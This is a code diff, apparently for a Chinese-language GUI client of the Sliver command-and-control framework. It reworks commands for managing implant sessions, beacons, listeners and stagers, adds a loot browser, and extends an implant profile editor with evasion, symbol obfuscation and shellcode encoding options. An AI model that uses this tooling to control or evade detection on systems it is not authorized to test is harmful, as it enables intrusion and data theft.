+      return appendServer(`[错误] 命令 ${cmd} 尚无完整 GUI 契约；请在“官方 Sliver 控制台”中使用。`, 'err');
+    }
+    const commandArgs = contract.positionals;
+    const options = contract.options;
+    args = commandArgs;
     switch (cmd) {
-      case 'help': return appendServer(SERVER_HELP, 'info');
       case 'clear': { const o = document.getElementById('sc-out'); if (o) o.innerHTML = ''; return; }
       case 'version': { const v = await App().GetVersion(); return appendServer(`Sliver v${v.major}.${v.minor}.${v.patch}  ${v.os}/${v.arch}  (${v.compiled||''})`, 'out'); }
       case 'sessions': {
-        const s = await App().ListSessions(); if (!s.length) return appendServer('no sessions', 'info');
+        await refreshAgents();
+        if (commandArgs.length && commandArgs[0] !== 'prune') return appendServer(`未知子命令 sessions ${commandArgs[0]}；本次命令未执行。`, 'err');
+        const sessionByPrefix = value => visibleSessions().find(item => item.id.startsWith(value) || item.name === value);
+        if (options.interact) {
+          const session = sessionByPrefix(options.interact);
+          if (!session) return appendServer(`找不到 Session：${options.interact}`, 'err');
+          openInteract('session', session);
+          return appendServer(`[+] interacting with ${session.hostname || session.id}`, 'out');
+        }
+        let killTargets = [];
+        if (options.kill) {
+          const session = sessionByPrefix(options.kill);
+          if (!session) return appendServer(`找不到 Session：${options.kill}`, 'err');
+          killTargets = [session];
+        } else if (options['kill-all']) killTargets = visibleSessions();
+        else if (options.clean || commandArgs[0] === 'prune') killTargets = visibleSessions().filter(item => item.isDead);
+        if (killTargets.length) {
+          if (!(await uiConfirm(`确定终止 ${killTargets.length} 个 Session 吗？`, { title:'终止 Session', okLabel:'终止', danger:true }))) return;
+          for (const session of killTargets) await App().KillSession(session.id);
+          await refreshAgents();
+          return appendServer(`[+] 已终止 ${killTargets.length} 个 Session`, 'out');
+        }
+        let s = visibleSessions().filter(item => matchesCommandFilter(item, options.filter, options['filter-re']));
+        if (!s.length) return appendServer('no visible sessions', 'info');
         let o = 'ID           HOST                 USER                 OS/ARCH\n';
         s.forEach(x => o += `${x.id.slice(0,12).padEnd(13)}${(x.hostname||'').slice(0,20).padEnd(21)}${(x.username||'').slice(0,20).padEnd(21)}${x.os}/${x.arch}\n`);
         return appendServer(o.trimEnd(), 'out');
       }
       case 'beacons': {
-        const b = await App().ListBeacons(); if (!b.length) return appendServer('no beacons', 'info');
+        await refreshAgents();
+        if (commandArgs.length && !['rm','prune','watch'].includes(commandArgs[0])) return appendServer(`未知子命令 beacons ${commandArgs[0]}；本次命令未执行。`, 'err');
+        const beaconByPrefix = value => visibleBeacons().find(item => item.id.startsWith(value) || item.name === value);
+        if (options.interact) {
+          const beacon = beaconByPrefix(options.interact);
+          if (!beacon) return appendServer(`找不到 Beacon：${options.interact}`, 'err');
+          openInteract('beacon', beacon);
+          return appendServer(`[+] interacting with ${beacon.hostname || beacon.id}`, 'out');
+        }
+        let killTargets = [];
+        if (options.kill) {
+          const beacon = beaconByPrefix(options.kill);
+          if (!beacon) return appendServer(`找不到 Beacon：${options.kill}`, 'err');
+          killTargets = [beacon];
+        } else if (options['kill-all']) killTargets = visibleBeacons();
+        else if (commandArgs[0] === 'rm') {
+          const beacon = beaconByPrefix(commandArgs[1] || '');
+          if (!beacon) return appendServer(`找不到 Beacon：${commandArgs[1] || ''}`, 'err');
+          killTargets = [beacon];
+        }
+        if (killTargets.length) {
+          if (!(await uiConfirm(`确定终止 ${killTargets.length} 个 Beacon 吗？`, { title:'终止 Beacon', okLabel:'终止', danger:true }))) return;
+          for (const beacon of killTargets) await App().KillBeacon(beacon.id);
+          await refreshAgents();
+          return appendServer(`[+] 已终止 ${killTargets.length} 个 Beacon`, 'out');
+        }
+        if (commandArgs[0] === 'prune' || commandArgs[0] === 'watch') return appendServer(`当前 GUI 尚未映射官方子命令 beacons ${commandArgs[0]}；本次命令未执行。`, 'err');
+        let b = visibleBeacons().filter(item => matchesCommandFilter(item, options.filter, options['filter-re']));
+        if (!b.length) return appendServer('no visible beacons', 'info');
         let o = 'ID           HOST                 USER                 INTERVAL\n';
         b.forEach(x => o += `${x.id.slice(0,12).padEnd(13)}${(x.hostname||'').slice(0,20).padEnd(21)}${(x.username||'').slice(0,20).padEnd(21)}${fmtDur(x.interval)}\n`);
         return appendServer(o.trimEnd(), 'out');
       }
       case 'jobs': case 'listeners': {
-        if (args[0] === 'kill') { if (!args[1]) return appendServer('usage: jobs kill <id>', 'err'); if (!(await uiConfirm(`确定终止 Job ${esc(args[1])} 吗？`, { title:'终止 Job', okLabel:'终止', danger:true }))) return; await App().KillJob(parseInt(args[1])); return appendServer(`[+] job ${args[1]} killed`, 'out'); }
+        if (options.kill !== undefined && options.kill !== -1) { if (!(await uiConfirm(`确定终止 Job ${esc(options.kill)} 吗？`, { title:'终止 Job', okLabel:'终止', danger:true }))) return; await App().KillJob(options.kill); return appendServer(`[+] job ${options.kill} killed`, 'out'); }
+        if (options['kill-all']) {
+          const jobs = await App().ListJobs();
+          if (!(await uiConfirm(`确定终止全部 ${jobs.length} 个 Job 吗？`, { title:'终止全部 Job', okLabel:'全部终止', danger:true }))) return;
+          for (const job of jobs) await App().KillJob(job.id);
+          return appendServer(`[+] 已终止 ${jobs.length} 个 Job`, 'out');
+        }
         const j = await App().ListJobs(); if (!j.length) return appendServer('no active jobs', 'info');
         let o = 'ID    NAME       PROTO   PORT\n';
         j.forEach(x => o += `${String(x.id).padEnd(6)}${(x.name||'').padEnd(11)}${(x.protocol||'').padEnd(8)}${x.port||''}\n`);
@@ -3769,23 +4370,44 @@ async function runServerCmd(raw) {
         const l = await App().GetLoot(); if (!l.length) return appendServer('loot store empty', 'info');
         return appendServer(l.map(x => `${x.id.slice(0,12)}  ${(x.type||'').padEnd(10)} ${x.name}`).join('\n'), 'out');
       }
-      case 'builds': { const b = await App().GetBuildHistory(); if (!b.length) return appendServer('no builds', 'info'); return appendServer(b.map(x => `${(x.name||'').padEnd(24)} ${x.goos}/${x.goarch} ${x.format}`).join('\n'), 'out'); }
+      case 'builds': case 'implants': { const b = await App().GetBuildHistory(); if (!b.length) return appendServer('no builds', 'info'); return appendServer(b.map(x => `${(x.name||'').padEnd(24)} ${x.goos}/${x.goarch} ${x.format}`).join('\n'), 'out'); }
       case 'profiles': { const p = await App().ListImplantProfiles(); if (!p.length) return appendServer('no profiles', 'info'); return appendServer(p.map(x => `${(x.name||'').padEnd(20)} ${x.goos}/${x.goarch} ${x.c2Url||''}`).join('\n'), 'out'); }
       case 'use': {
         if (!args[0]) return appendServer('usage: use <id-prefix>', 'err');
-        const all = [...allSessions.map(s => ({kind:'session',obj:s})), ...allBeacons.map(b => ({kind:'beacon',obj:b}))];
+        const all = [...availableSessions().map(s => ({kind:'session',obj:s})), ...visibleBeacons().filter(b => !b.isDead).map(b => ({kind:'beacon',obj:b}))];
         const m = all.find(a => a.obj.id.startsWith(args[0]));
         if (!m) return appendServer(`no session/beacon matching ${args[0]}`, 'err');
         openInteract(m.kind, m.obj); return appendServer(`[+] interacting with ${m.obj.hostname}`, 'out');
       }
-      case 'mtls': { await App().StartMTLSListener({host:'0.0.0.0',port:parseInt(args[0])||8443}); return appendServer(`[+] mTLS listener started on :${parseInt(args[0])||8443}`, 'out'); }
-      case 'http': { await App().StartHTTPListener({host:'0.0.0.0',port:parseInt(args[0])||80,secure:false}); return appendServer(`[+] HTTP listener started on :${parseInt(args[0])||80}`, 'out'); }
-      case 'https': { await App().StartHTTPListener({host:'0.0.0.0',port:parseInt(args[0])||443,secure:true}); return appendServer(`[+] HTTPS listener started on :${parseInt(args[0])||443}`, 'out'); }
-      case 'dns': { if (!args.length) return appendServer('usage: dns <domain...>', 'err'); await App().StartDNSListener({domains:args}); return appendServer(`[+] DNS listener for ${args.join(', ')}`, 'out'); }
-      case 'wg': case 'wireguard': { await App().StartWGListener({port:parseInt(args[0])||53,nPort:parseInt(args[1])||8888,keyPort:parseInt(args[2])||1337}); return appendServer(`[+] WireGuard listener started`, 'out'); }
-      case 'kill-session': case 'rm-session': { if (!args[0]) return appendServer('usage: kill-session <id-prefix>', 'err'); const s = allSessions.find(x => x.id.startsWith(args[0])); if (!s) return appendServer('no matching session', 'err'); if (!(await uiConfirm(`确定终止 ${esc(s.hostname || s.id)} 上的会话吗？`, { title:'终止会话', okLabel:'终止', danger:true }))) return; await App().KillSession(s.id); return appendServer(`[+] killed session ${s.hostname}`, 'out'); }
-      case 'kill-beacon': case 'rm-beacon': { if (!args[0]) return appendServer('usage: kill-beacon <id-prefix>', 'err'); const b = allBeacons.find(x => x.id.startsWith(args[0])); if (!b) return appendServer('no matching beacon', 'err'); if (!(await uiConfirm(`确定终止 ${esc(b.hostname || b.id)} 上的信标吗？`, { title:'终止信标', okLabel:'终止', danger:true }))) return; await App().KillBeacon(b.id); return appendServer(`[+] removed beacon ${b.hostname}`, 'out'); }
-      case 'rename': { if (args.length < 2) return appendServer('usage: rename <session-id-prefix> <new-name>', 'err'); const s = allSessions.find(x => x.id.startsWith(args[0])); if (!s) return appendServer('no matching session', 'err'); await App().RenameSession(s.id, args.slice(1).join(' ')); refreshAgents(); return appendServer('[+] renamed', 'out'); }
+      case 'mtls': {
+        const host = options.lhost || '0.0.0.0', port = options.lport ?? 8888;
+        await App().StartMTLSListener({host, port});
+        return appendServer(`[+] mTLS listener started on ${host}:${port}`, 'out');
+      }
+      case 'http': case 'https': {
+        const secure = cmd === 'https', host = options.lhost || '0.0.0.0', port = options.lport ?? (secure ? 443 : 80);
+        await App().StartHTTPListener({
+          domain:options.domain || '', website:options.website || '', host, port, secure,
+          acme:Boolean(options['lets-encrypt']), enforceOtp:!options['disable-otp'],
+          longPollTimeout:durationNanoseconds(options['long-poll-timeout'] || '1s'),
+          longPollJitter:durationNanoseconds(options['long-poll-jitter'] || '2s'),
+          randomizeJarm:secure && !options['disable-randomized-jarm'],
+        });
+        return appendServer(`[+] ${secure ? 'HTTPS' : 'HTTP'} listener started on ${host}:${port}`, 'out');
+      }
+      case 'dns': {
+        if (!options.domains) return appendServer('参数 --domains 是必需的；本次命令未执行。', 'err');
+        const domains = options.domains.split(',').map(value => value.trim()).filter(Boolean);
+        await App().StartDNSListener({domains, host:options.lhost || '0.0.0.0', port:options.lport ?? 53, canaries:!options['no-canaries'], enforceOtp:true});
+        return appendServer(`[+] DNS listener for ${domains.join(', ')}`, 'out');
+      }
+      case 'wg': case 'wireguard': {
+        await App().StartWGListener({host:options.lhost || '', port:options.lport ?? 53, nPort:options.nport ?? 8888, keyPort:options['key-port'] ?? 1337});
+        return appendServer('[+] WireGuard listener started', 'out');
+      }
+      case 'kill-session': case 'rm-session': { if (!args[0]) return appendServer('usage: kill-session <id-prefix>', 'err'); const s = visibleSessions().find(x => x.id.startsWith(args[0])); if (!s) return appendServer('no matching visible session', 'err'); if (!(await uiConfirm(`确定终止 ${esc(s.hostname || s.id)} 上的会话吗？`, { title:'终止会话', okLabel:'终止', danger:true }))) return; await App().KillSession(s.id); return appendServer(`[+] killed session ${s.hostname}`, 'out'); }
+      case 'kill-beacon': case 'rm-beacon': { if (!args[0]) return appendServer('usage: kill-beacon <id-prefix>', 'err'); const b = visibleBeacons().find(x => x.id.startsWith(args[0])); if (!b) return appendServer('no matching visible beacon', 'err'); if (!(await uiConfirm(`确定终止 ${esc(b.hostname || b.id)} 上的信标吗？`, { title:'终止信标', okLabel:'终止', danger:true }))) return; await App().KillBeacon(b.id); return appendServer(`[+] removed beacon ${b.hostname}`, 'out'); }
+      case 'rename': { if (args.length < 2) return appendServer('usage: rename <session-id-prefix> <new-name>', 'err'); const s = visibleSessions().find(x => x.id.startsWith(args[0])); if (!s) return appendServer('no matching visible session', 'err'); await App().RenameSession(s.id, args.slice(1).join(' ')); refreshAgents(); return appendServer('[+] renamed', 'out'); }
       case 'c2profiles': { const p = await App().ListC2Profiles(); if (!p.length) return appendServer('no HTTP C2 profiles', 'info'); return appendServer(p.map(x => x.name).join('\n'), 'out'); }
       case 'certificates': case 'certs': {
         const c = await App().ListCertificates(); if (!c.length) return appendServer('no certificates', 'info');
@@ -3808,8 +4430,11 @@ async function runServerCmd(raw) {
       case 'armory': {
         const sub = (args[0]||'').toLowerCase();
         if (sub === 'install') {
-          if (!args[1]) return appendServer('用法：armory install <包名>', 'err');
-          return installArmoryPackage(args[1]);
+          if (!args[1]) return appendServer('用法：armory install <官方索引包名>\n先执行 armory 查看可安装包；这里不接受 .tar.gz 文件路径。', 'err');
+          if (/[\\/]/.test(args[1]) || /\.(?:tar\.gz|tgz)$/i.test(args[1])) {
+            return appendServer('armory install 需要官方 Armory 索引中的包名，不能使用文件路径。GUI 运行在操作员本机，无法读取 Teamserver 或目标主机上的 /home/... 路径。请先执行 armory 查看可安装包。', 'err');
+          }
+          return installArmoryPackage(args.slice(1).join(' '));
         }
         if (sub === 'remove' || sub === 'rm') {
           if (!args[1]) return appendServer('用法：armory remove <包名>', 'err');
@@ -3824,6 +4449,34 @@ async function runServerCmd(raw) {
         pkgs.forEach(p => { out += `${(p.name||'').slice(0,27).padEnd(28)}${(p.type === 'alias' ? '别名' : '扩展').padEnd(11)}${(p.installed?'是':'否').padEnd(11)}${(p.description||'').slice(0,50)}
 `; });
         return appendServer(out.trimEnd(), 'out');
+      }
+      case 'extensions': case 'aliases': case 'ext-list': {
+        if (cmd === 'extensions' && (args[0] || '').toLowerCase() === 'install') {
+          const localPath = args.slice(1).join(' ').trim();
+          if (!localPath) return appendServer('用法：extensions install <GUI 客户端本机目录或 .tar.gz>\nTeamserver 上的 /home/... 文件需先下载到 Windows。', 'err');
+          const error = await App().InstallLocalExtension(localPath).then(() => null).catch(error => error);
+          if (error) return appendServer(`[错误] ${rpcErrorMessage(error, '本地扩展安装失败')}`, 'err');
+          appendServer(`[成功] 已从 ${localPath} 安装扩展`, 'out');
+        } else if (args.length) {
+          return appendServer(cmd === 'extensions' ? '用法：extensions | extensions install <GUI 本机目录或 .tar.gz>' : `用法：${cmd}`, 'err');
+        }
+        const installed = await App().ListInstalledExtensions();
+        if (!installed.length) return appendServer('本机尚未安装扩展命令。请在扩展中心或使用 armory install <包名> 安装。', 'info');
+        let out = `${'命令'.padEnd(24)}${'类型'.padEnd(12)}${'参数'.padEnd(32)}说明\n`;
+        installed.forEach(item => {
+          const type = item.isBof ? 'BOF' : 'Extension';
+          out += `${(item.command || '').slice(0,23).padEnd(24)}${type.padEnd(12)}${(item.args || '').slice(0,31).padEnd(32)}${item.help || ''}\n`;
+        });
+        out += '\n执行方式：进入 Session/Beacon 目标工作区，使用 ext <命令> [参数]。';
+        return appendServer(out.trimEnd(), 'out');
+      }
+      case 'mcp': {
+        openMCPPanel();
+        return appendServer('[*] 已打开 MCP 服务面板；请在面板中启动、停止或修改配置。', 'info');
+      }
+      case 'official-console': {
+        openOfficialConsolePanel();
+        return appendServer('[*] 已打开官方控制台；其中的命令由所选 sliver-client 原样解析和执行。', 'info');
       }
       case 'restart-jobs': { if (!args.length) return appendServer('usage: restart-jobs <id> [id...]', 'err'); await App().RestartJobs(args.map(a => parseInt(a))); return appendServer(`[+] restarted jobs ${args.join(', ')}`, 'out'); }
       case 'ca': case 'certificate-authority': {
@@ -3846,18 +4499,18 @@ async function runServerCmd(raw) {
         const lines = []; const walk = (n, d) => { lines.push(`${'  '.repeat(d)}${n.hostname||n.name||('peer '+n.peerId)}`); (n.children||[]).forEach(c => walk(c, d+1)); };
         g.forEach(n => walk(n, 0)); return appendServer(lines.join('\n'), 'out');
       }
-      case 'wg-client-config': {
+      case 'wg-config': case 'wg-client-config': {
         const c = await App().GenerateWGClientConfig();
         return appendServer(`ClientIP:         ${c.clientIP}\nClientPrivateKey: ${c.clientPrivateKey}\nClientPubKey:     ${c.clientPubKey}\nServerPubKey:     ${c.serverPubKey}`, 'out');
       }
       case 'wg-unique-ip': { const ip = await App().GenerateUniqueWGIP(); return appendServer(`[+] unique WG IP: ${ip}`, 'out'); }
-      case 'dll2shellcode': case 'srdi': {
-        if (args.length < 2) return appendServer('usage: dll2shellcode <local.dll> <function> [args]', 'err');
+      case 'dll2shellcode': case 'srdi': case 'shellcode-rdi': {
+        if (args.length < 2) return appendServer('usage: shellcode-rdi <local.dll> <function> [args]', 'err');
         const p = await App().ConvertDLLToShellcode(args[0], args[1], args.slice(2).join(' '));
         return appendServer(`[+] shellcode saved to ${p}`, 'out');
       }
-      case 'shellcode-encode': {
-        if (!args[0]) return appendServer('usage: shellcode-encode <local.bin> [arch=amd64] [iterations=1]', 'err');
+      case 'shikata-ga-nai': case 'shellcode-encode': {
+        if (!args[0]) return appendServer('usage: shikata-ga-nai <local.bin> [arch=amd64] [iterations=1]', 'err');
         const p = await App().EncodeShellcode(args[0], args[1]||'amd64', parseInt(args[2])||1);
         return appendServer(`[+] encoded shellcode saved to ${p}`, 'out');
       }
@@ -3906,13 +4559,22 @@ async function runServerCmd(raw) {
         c.forEach(x => o += `${(x.domain||'').slice(0,30).padEnd(31)}${(x.implantName||'').slice(0,20).padEnd(21)}${(x.triggered?'YES':'no').padEnd(11)}${x.count}\n`);
         return appendServer(o.trimEnd(), 'out');
       }
+      case 'stage-listener':
       case 'stager': {
-        if (args.length < 3) return appendServer('usage: stager <host> <port> <profile>', 'err');
-        const jid = await App().StartStagerListener(args[0], parseInt(args[1]), args[2]).catch(e => { appendServer(`[error] ${e}`, 'err'); return null; });
-        if (jid !== null) return appendServer(`[+] TCP stager listener started on ${args[0]}:${args[1]} (job ${jid})`, 'out');
+        if (!options.url || !options.profile) return appendServer('参数 --url 和 --profile 是必需的；本次命令未执行。', 'err');
+        let listenerURL;
+        try { listenerURL = new URL(options.url); } catch (_) { return appendServer(`无效 Stager URL：${options.url}`, 'err'); }
+        if (listenerURL.protocol !== 'tcp:') return appendServer('当前 GUI 的 RPC 仅支持 tcp:// Stage Listener；本次命令未执行。', 'err');
+        const host = listenerURL.hostname, port = Number(listenerURL.port);
+        if (!host || !port) return appendServer('Stager URL 必须包含主机和端口，例如 tcp://0.0.0.0:8080。', 'err');
+        const jid = await App().StartStagerListener(host, port, options.profile).catch(e => { appendServer(`[error] ${e}`, 'err'); return null; });
+        if (jid !== null) return appendServer(`[+] TCP stager listener started on ${host}:${port} (job ${jid})`, 'out');
         return;
       }
-      default: appendServer(`unknown server command: ${cmd}  (type 'help')`, 'err');
+      default:
+        return appendServer(contract.official
+          ? `[错误] 官方命令 ${contract.spec.commandPath || cmd} 尚未由 GUI 完整映射；请在“官方 Sliver 控制台”中使用。`
+          : `[错误] 未知服务器命令 ${cmd}；输入 help 查看 GUI 支持的命令，或打开“官方 Sliver 控制台”使用原生命令。`, 'err');
     }
   } catch (e) { appendServer('[error] ' + e, 'err'); }
 }
@@ -3948,9 +4610,19 @@ async function openOperatorsPanel() {
 }
 
 function openLootPanel() {
-  openViewPanel('_loot', '战利品', `<div style="overflow:auto;flex:1" id="loot-list"><div style="padding:10px;color:var(--muted)">正在加载...</div></div>`);
+  openViewPanel('_loot', '战利品', `<div class="loot-workbench">
+    <div class="loot-browser">
+      <div class="loot-toolbar"><input id="loot-filter" placeholder="筛选名称、ID 或来源主机"/><select id="loot-type"><option value="">全部类型</option><option value="TEXT">文本</option><option value="BINARY">二进制</option><option value="NO_FILE">无文件</option></select><button class="btn small" id="loot-refresh">刷新</button></div>
+      <div id="loot-list" class="loot-list"><div class="empty-state">正在加载...</div></div>
+    </div>
+    <aside id="loot-detail" class="loot-detail"><div class="empty-state">选择一条战利品查看详情</div></aside>
+  </div>`);
+  document.getElementById('loot-filter')?.addEventListener('input', renderLootList);
+  document.getElementById('loot-type')?.addEventListener('change', renderLootList);
+  document.getElementById('loot-refresh')?.addEventListener('click', refreshLootList);
   refreshLootList();
 }
+let lootItems = [];
 
 // HTTP C2 profile editor. Advanced JSON remains the source of truth; the basic
 // form only merges fields it owns so unknown server options are preserved.
@@ -4045,9 +4717,35 @@ async function openC2Editor(name, initialJSON = '', onSaved = null) {
 }
 async function refreshLootList() {
   const el = document.getElementById('loot-list'); if (!el) return;
-  const loot = await App().GetLoot().catch(() => []);
-  if (!loot?.length) { el.innerHTML = '<div style="padding:10px;color:var(--muted)">暂无战利品。</div>'; return; }
-  el.innerHTML = loot.map(l => `<div style="padding:4px 10px;font-size:12.5px;display:flex;gap:10px;align-items:center;border-bottom:1px solid var(--border)"><span style="flex:1">${esc(l.name)}</span><span style="color:var(--muted)">${esc(l.type)}</span><span style="color:var(--muted);font-family:var(--mono)">${esc(l.id.slice(0,10))}</span><button class="btn small" onclick="lootDownload('${esc(l.id)}')">下载</button><button class="btn small danger" onclick="deleteLoot('${esc(l.id)}', '${esc(l.name)}')">删除</button></div>`).join('');
+  el.innerHTML = '<div class="empty-state">正在读取 Teamserver Loot...</div>';
+  const result = await App().GetLoot().then(items => ({items})).catch(error => ({error}));
+  if (result.error) { el.innerHTML = rpcErrorHtml(result.error, '读取战利品失败'); return; }
+  lootItems = result.items || [];
+  renderLootList();
+}
+function renderLootList() {
+  const el = document.getElementById('loot-list'); if (!el) return;
+  const query = (document.getElementById('loot-filter')?.value || '').trim().toLowerCase();
+  const type = document.getElementById('loot-type')?.value || '';
+  const filtered = lootItems.filter(item => (!type || item.type === type) && (!query || [item.name,item.id,item.originHost].some(value => String(value||'').toLowerCase().includes(query))));
+  if (!filtered.length) { el.innerHTML = `<div class="empty-state">${lootItems.length ? '没有匹配的战利品' : '暂无战利品'}</div>`; return; }
+  el.innerHTML = filtered.map(item => `<button class="loot-row" data-loot-id="${esc(item.id)}"><span><strong>${esc(item.name || '未命名')}</strong><small>${esc(item.id)}</small></span><em>${esc(item.type)}</em><span>${fmtSize(item.size)}</span></button>`).join('');
+  el.querySelectorAll('[data-loot-id]').forEach(button => button.addEventListener('click', () => showLootDetail(button.dataset.lootId)));
+}
+async function showLootDetail(lootID) {
+  const detail = document.getElementById('loot-detail'); if (!detail) return;
+  const item = lootItems.find(entry => entry.id === lootID) || {};
+  detail.innerHTML = '<div class="empty-state"><span class="spinner"></span>正在读取详情...</div>';
+  const result = await App().PreviewLoot(lootID).then(preview => ({preview})).catch(error => ({error}));
+  if (result.error) { detail.innerHTML = rpcErrorHtml(result.error, '读取战利品详情失败'); return; }
+  const preview = result.preview || item;
+  detail.innerHTML = `<div class="section-heading"><div><h3>${esc(preview.name || '未命名')}</h3><p>${esc(preview.type || '未知类型')} · ${fmtSize(preview.size)}</p></div></div>
+    <dl class="loot-meta"><div><dt>ID</dt><dd><code>${esc(preview.id || lootID)}</code></dd></div><div><dt>来源主机</dt><dd><code>${esc(preview.originHost || '未记录')}</code></dd></div></dl>
+    ${preview.message ? `<div class="task-note">${esc(preview.message)}</div>` : ''}
+    ${preview.previewable ? `<pre class="loot-preview">${esc(preview.preview || '')}</pre>` : '<div class="empty-state">此条目不支持安全文本预览</div>'}
+    <div class="loot-actions"><button class="btn accent" data-loot-download>下载</button><button class="btn danger" data-loot-delete>删除</button></div>`;
+  detail.querySelector('[data-loot-download]')?.addEventListener('click', () => lootDownload(lootID));
+  detail.querySelector('[data-loot-delete]')?.addEventListener('click', () => deleteLoot(lootID, preview.name || item.name || '未命名'));
 }
 function deleteLoot(id, name) {
   return runDangerousAction({ title:'删除战利品', message:`确定永久删除“${esc(name)}”吗？`, okLabel:'删除', action:()=>App().DeleteLoot(id), success:'战利品已删除', refresh:refreshLootList });
@@ -4147,10 +4845,7 @@ function profilesContent() {
             <div class="gen-field"><label>输出扩展名</label><input name="extension" placeholder="例如 exe、dll；留空自动选择"/></div>
           </div>
           <div class="profile-checks">
-            <label class="check-label"><input type="checkbox" name="debug"/> 调试模式</label>
             <label class="check-label"><input type="checkbox" name="evasion"/> 启用规避功能</label>
-            <label class="check-label"><input type="checkbox" name="obfuscateSymbols" checked/> 混淆符号</label>
-            <label class="check-label"><input type="checkbox" name="netGo"/> 强制 NetGo</label>
             <label class="check-label"><input type="checkbox" name="runAtLoad" id="prof-run-at-load"/> 共享库加载时运行</label>
             <label class="check-label"><input type="checkbox" name="beacon" id="prof-beacon"/> 信标模式</label>
           </div>
@@ -4158,6 +4853,19 @@ function profilesContent() {
             <div class="gen-field"><label>信标间隔（秒）</label><input name="interval" type="number" min="1" value="60"/></div>
             <div class="gen-field"><label>信标抖动（秒）</label><input name="jitter" type="number" min="0" value="30"/></div>
           </div>
+        </fieldset>
+        <fieldset class="profile-section size-optimizer"><legend>体积优化（实验）</legend>
+          <div class="size-optimizer-head">
+            <div><strong id="prof-size-status">正在评估当前配置</strong><span id="prof-size-detail">实际大小由 Teamserver 的 Sliver 版本和编译链决定。</span></div>
+            <button type="button" class="btn small" id="prof-size-optimize">应用精简预设</button>
+          </div>
+          <div class="profile-checks">
+            <label class="check-label"><input type="checkbox" name="debug"/> 调试模式</label>
+            <label class="check-label"><input type="checkbox" name="obfuscateSymbols" checked/> 混淆符号</label>
+            <label class="check-label"><input type="checkbox" name="netGo"/> 强制 NetGo</label>
+          </div>
+          <div class="size-impact-list" id="prof-size-impact"></div>
+          <p class="field-note">“应用精简预设”只关闭上面三个 Sliver 原生选项，不会删除 C2、流量编码器或其他能力。当前 RPC 不支持设置 Go 链接器的 <code>-s -w</code>，因此不提供虚假开关，也无法在生成前准确预测 MB 数。</p>
         </fieldset>
         <fieldset class="profile-section"><legend>C2 与连接</legend>
           <div class="gen-field"><label>多个 C2（每行：优先级 | URL | 可选协议参数）</label><textarea name="c2Entries" rows="6" placeholder="1 | mtls://10.0.0.5:8888&#10;2 | https://example.com:443&#10;3 | dns://c2.example.com&#10;4 | wg://10.0.0.5:51820&#10;5 | tcp-pivot://pivot:9898&#10;6 | namedpipe://host/pipe/sliver" required></textarea><span class="field-note">支持 mTLS、HTTP/HTTPS、DNS、WireGuard、TCP Pivot 与 Named Pipe Pivot；协议参数写在第三列。</span></div>
@@ -4216,6 +4924,28 @@ function wireProfileForm() {
   const httpActions = [...document.querySelectorAll('[data-http-c2-action]')];
   const hasHTTPTransport = () => parseProfileC2(f.c2Entries.value).some(entry => /^https?:\/\//i.test(entry.url));
   const hasWireGuardTransport = () => parseProfileC2(f.c2Entries.value).some(entry => /^(wg|wireguard):\/\//i.test(entry.url));
+  const updateSizeAssessment = () => {
+    const status = document.getElementById('prof-size-status'), detail = document.getElementById('prof-size-detail'), impact = document.getElementById('prof-size-impact');
+    if (!status || !detail || !impact) return;
+    const protocols = new Set(parseProfileC2(f.c2Entries.value).map(entry => {
+      const scheme = String(entry.url).split(':', 1)[0].toLowerCase();
+      return scheme === 'http' || scheme === 'https' ? 'http(s)' : scheme === 'wireguard' ? 'wg' : scheme;
+    }).filter(Boolean));
+    const factors = [];
+    if (f.debug.checked) factors.push('调试模式会保留额外诊断信息');
+    if (f.obfuscateSymbols.checked) factors.push('符号混淆通常会增大构建结果');
+    if (f.netGo.checked) factors.push('强制 NetGo 可能引入额外的纯 Go 网络实现');
+    if (protocols.size > 1) factors.push(`当前包含 ${protocols.size} 类 C2 传输；只保留必要协议通常更利于控制体积`);
+    if (!factors.length) {
+      status.textContent = '已应用当前 RPC 可控的精简项';
+      detail.textContent = '未启用调试、符号混淆或强制 NetGo，且当前最多一类 C2。';
+      impact.innerHTML = '<span class="size-impact good">配置侧暂无明显增大项</span>';
+      return;
+    }
+    status.textContent = factors.length >= 3 ? '当前配置有多项体积影响因素' : '当前配置仍有可优化项';
+    detail.textContent = `检测到 ${factors.length} 项；这是配置评估，不是文件大小预测。`;
+    impact.innerHTML = factors.map(text => `<span class="size-impact">${esc(text)}</span>`).join('');
+  };
   const refreshHTTPProfiles = async preferred => {
     const current = preferred || httpSelect.value;
     httpSelect.innerHTML = '<option value="">正在读取 Teamserver...</option>';
@@ -4239,7 +4969,7 @@ function wireProfileForm() {
     const wireGuardEnabled = hasWireGuardTransport();
     wgFields.forEach(input => { input.disabled = !wireGuardEnabled; });
   };
-  f.c2Entries.addEventListener('input', updateHTTPState);
+  f.c2Entries.addEventListener('input', () => { updateHTTPState(); updateSizeAssessment(); });
   httpSelect.addEventListener('change', updateHTTPState);
   document.getElementById('prof-http-c2-actions')?.addEventListener('click', async event => {
     const button = event.target.closest('[data-http-c2-action]'); if (!button || button.disabled) return;
@@ -4269,7 +4999,14 @@ function wireProfileForm() {
     document.getElementById('prof-beacon-opts').classList.toggle('hidden', !this.checked);
   });
   f.format.addEventListener('change', () => { f.runAtLoad.disabled = f.format.value !== 'shared'; if (f.runAtLoad.disabled) f.runAtLoad.checked = false; });
-  f.debug.addEventListener('change', () => { if (f.debug.checked) f.obfuscateSymbols.checked = false; });
+  f.debug.addEventListener('change', () => { if (f.debug.checked) f.obfuscateSymbols.checked = false; updateSizeAssessment(); });
+  f.obfuscateSymbols.addEventListener('change', updateSizeAssessment);
+  f.netGo.addEventListener('change', updateSizeAssessment);
+  document.getElementById('prof-size-optimize')?.addEventListener('click', () => {
+    f.debug.checked = false; f.obfuscateSymbols.checked = false; f.netGo.checked = false;
+    updateSizeAssessment();
+    toast('ok', '已应用精简预设；C2 和其他能力保持不变');
+  });
   document.getElementById('prof-cancel-edit')?.addEventListener('click', resetProfileForm);
   f.addEventListener('submit', async e => {
     e.preventDefault();
@@ -4284,6 +5021,7 @@ function wireProfileForm() {
     else { msg.textContent = f.dataset.editing ? '配置档案已更新' : '配置档案已保存'; msg.className = 'status-msg ok'; resetProfileForm(); updateHTTPState(); refreshProfilesList(); }
   });
   updateHTTPState();
+  updateSizeAssessment();
   refreshHTTPProfiles();
 }
 let implantProfilesCache = [];
@@ -4295,6 +5033,7 @@ function resetProfileForm() {
   document.getElementById('prof-cancel-edit').classList.add('hidden');
   document.getElementById('prof-beacon-opts').classList.add('hidden');
   f.runAtLoad.disabled = f.format.value !== 'shared';
+  f.c2Entries.dispatchEvent(new Event('input'));
 }
 function editImplantProfile(name) {
